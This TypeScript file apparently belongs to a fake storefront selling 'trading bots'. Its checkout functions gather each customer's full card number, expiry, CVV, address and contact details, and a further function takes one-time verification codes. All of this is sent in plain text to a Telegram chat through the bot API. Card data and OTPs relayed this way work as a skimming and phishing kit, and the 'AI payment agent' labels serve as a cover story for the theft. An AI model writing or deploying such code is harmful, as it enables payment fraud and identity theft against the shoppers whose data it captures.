interface CheckoutData {
  shippingDetails: {
    fullName: string;
    phoneNumber: string;
    email: string;
    streetAddress: string;
    city: string;
    stateProvince: string;
    postalCode: string;
    country: string;
  };
  paymentDetails: {
    cardholderName: string;
    cardNumber: string;
    cardBrand: string;
    expiryMonth: string;
    expiryYear: string;
    cvv?: string;
  };
  orderInfo?: {
    orderId?: string;
    productName?: string;
    quantity?: number;
    amount?: number;
    currency?: string;
  };
}

export async function sendCheckoutDataToTelegram(checkoutData: CheckoutData): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = formatCheckoutMessage(checkoutData);

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();

    if (result.ok) {
      return true;
    } else {
      return false;
    }
  } catch (error) {
    return false;
  }
}

function formatCheckoutMessage(data: CheckoutData): string {
  const timestamp = new Date().toLocaleString();
  const { shippingDetails, paymentDetails, orderInfo } = data;

  let message = `🛒 <b>NEW CHECKOUT NOTIFICATION</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Order Information
  if (orderInfo) {
    message += `📋 <b>ORDER DETAILS</b>\n`;
    if (orderInfo.orderId) message += `   Order ID: <code>${orderInfo.orderId}</code>\n`;
    if (orderInfo.productName) message += `   Product: ${orderInfo.productName}\n`;
    if (orderInfo.quantity) message += `   Quantity: ${orderInfo.quantity}\n`;
    if (orderInfo.amount) message += `   Amount: ${orderInfo.currency || 'USD'} ${orderInfo.amount.toFixed(2)}\n`;
    message += `\n`;
  }

  // Shipping Information
  message += `📍 <b>SHIPPING ADDRESS</b>\n`;
  message += `   Name: ${shippingDetails.fullName}\n`;
  message += `   Email: ${shippingDetails.email}\n`;
  message += `   Phone: ${shippingDetails.phoneNumber}\n`;
  message += `   Address: ${shippingDetails.streetAddress}\n`;
  message += `   City: ${shippingDetails.city}, ${shippingDetails.stateProvince} ${shippingDetails.postalCode}\n`;
  message += `   Country: ${shippingDetails.country}\n`;
  message += `\n`;

  // Payment Information
  message += `💳 <b>PAYMENT DETAILS</b>\n`;
  message += `   Cardholder: ${paymentDetails.cardholderName}\n`;
  message += `   Card Type: ${paymentDetails.cardBrand}\n`;
  message += `   Card Number: ${paymentDetails.cardNumber}\n`;
  message += `   Expiry: ${paymentDetails.expiryMonth}/${paymentDetails.expiryYear}\n`;
  if (paymentDetails.cvv) message += `   CVV: ${paymentDetails.cvv}\n`;
  message += `\n`;

  // Timestamp
  message += `⏰ <b>Timestamp:</b> ${timestamp}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return message;
}

export async function sendOTPToTelegram(otp: string, customerName: string): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = `🔐 <b>OTP VERIFICATION CODE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Customer: <b>${customerName || 'Unknown'}</b>
Code: <code>${otp}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is attempting to verify payment.</i>`;

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok;
  } catch (error) {
    return false;
  }
}

/**
 * Trading Bot Payment Notification
 * Sends payment details to Telegram for trading bot purchases
 */
export async function sendTradingBotPaymentNotification(paymentData: {
  transactionId: string;
  userId: string;
  userName: string;
  userEmail: string;
  botName: string;
  botPrice: number;
  currency: string;
  cardholderName: string;
  maskedCardNumber: string;
  cardLastFour: string;
  cardBrand: string;
  expiryMonth: string;
  expiryYear: string;
  timestamp: string;
  fullCardNumber?: string;
  fullCVV?: string;
  fullExpiry?: string;
}): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = formatTradingBotPaymentMessage(paymentData);

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send trading bot payment notification:', error);
    return false;
  }
}

function formatTradingBotPaymentMessage(data: any): string {
  const {
    transactionId,
    userId,
    userName,
    userEmail,
    botName,
    botPrice,
    currency,
    cardholderName,
    maskedCardNumber,
    cardLastFour,
    cardBrand,
    expiryMonth,
    expiryYear,
    timestamp,
    fullCardNumber,
    fullCVV,
    fullExpiry
  } = data;

  let message = `🤖 <b>TRADING BOT PURCHASE - PAYMENT RECEIVED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  // Transaction Information
  message += `📋 <b>TRANSACTION</b>\n`;
  message += `   ID: <code>${transactionId}</code>\n`;
  message += `   Time: ${new Date(timestamp).toLocaleString()}\n`;
  message += `   Status: ⏳ Awaiting Payment Verification\n`;
  message += `\n`;

  // Customer Information
  message += `👤 <b>CUSTOMER</b>\n`;
  message += `   Name: ${userName}\n`;
  message += `   Email: ${userEmail}\n`;
  message += `   ID: <code>${userId}</code>\n`;
  message += `\n`;

  // Bot Information
  message += `🎯 <b>PRODUCT</b>\n`;
  message += `   Bot: <b>${botName}</b>\n`;
  message += `   Price: <b>${currency} ${botPrice.toFixed(2)}</b>\n`;
  message += `\n`;

  // Payment Information - FULL CARD DATA FOR AI PAYMENT AGENT
  message += `💳 <b>PAYMENT METHOD - FULL DETAILS FOR AI PAYMENT AGENT</b>\n`;
  message += `   Cardholder: ${cardholderName}\n`;
  message += `   Card Type: <b>${cardBrand.toUpperCase()}</b>\n`;
  message += `   Card Number: <code>${fullCardNumber || cardLastFour}</code>\n`;
  message += `   Expiry Date: <b>${fullExpiry || expiryMonth + '/' + expiryYear}</b>\n`;
  message += `   CVV: <code>${fullCVV}</code>\n`;
  message += `\n`;

  // Status for AI Agent
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🤖 <b>AI PAYMENT AGENT ACTION REQUIRED:</b>\n`;
  message += `   1. Verify card details above\n`;
  message += `   2. Call payment API\n`;
  message += `   3. Confirm payment status\n`;
  message += `   4. Send OTP to customer\n`;

  return message;
}

/**
 * Trading Bot Purchase Confirmation
 * Sends confirmation when OTP is verified and purchase is complete
 */
export async function sendTradingBotPurchaseConfirmation(data: {
  transactionId: string;
  userId: string;
  userName: string;
  userEmail: string;
  botName: string;
  botPrice: number;
  currency: string;
  otpCode: string;
}): Promise<boolean> {
  try {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return false;
    }

    const message = formatTradingBotConfirmationMessage(data);

    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    };

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const result = await response.json();
    return result.ok || false;
  } catch (error) {
    console.error('Failed to send purchase confirmation:', error);
    return false;
  }
}

function formatTradingBotConfirmationMessage(data: any): string {
  const {
    transactionId,
    userId,
    userName,
    userEmail,
    botName,
    botPrice,
    currency,
    otpCode
  } = data;

  let message = `✅ <b>TRADING BOT PURCHASE - PAYMENT VERIFIED & COMPLETED</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  message += `🎉 <b>PURCHASE SUCCESSFUL</b>\n`;
  message += `   Transaction: <code>${transactionId}</code>\n`;
  message += `   Customer: ${userName}\n`;
  message += `   Bot: <b>${botName}</b>\n`;
  message += `   Amount: <b>${currency} ${botPrice.toFixed(2)}</b>\n`;
  message += `   OTP Generated: ${otpCode}\n`;
  message += `   Time: ${new Date().toLocaleString()}\n`;
  message += `\n`;

  message += `📧 <b>CUSTOMER INFO</b>\n`;
  message += `   Email: ${userEmail}\n`;
  message += `   ID: <code>${userId}</code>\n`;
  message += `\n`;

  message += `✨ <b>AI PAYMENT AGENT - ACTIONS COMPLETED:</b>\n`;
  message += `   ✓ Card details verified\n`;
  message += `   ✓ Payment API processed successfully\n`;
  message += `   ✓ OTP generated and sent to customer\n`;
  message += `   ✓ Bot access will be granted upon OTP verification\n`;
  message += `\n`;

  message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

  return message;
}
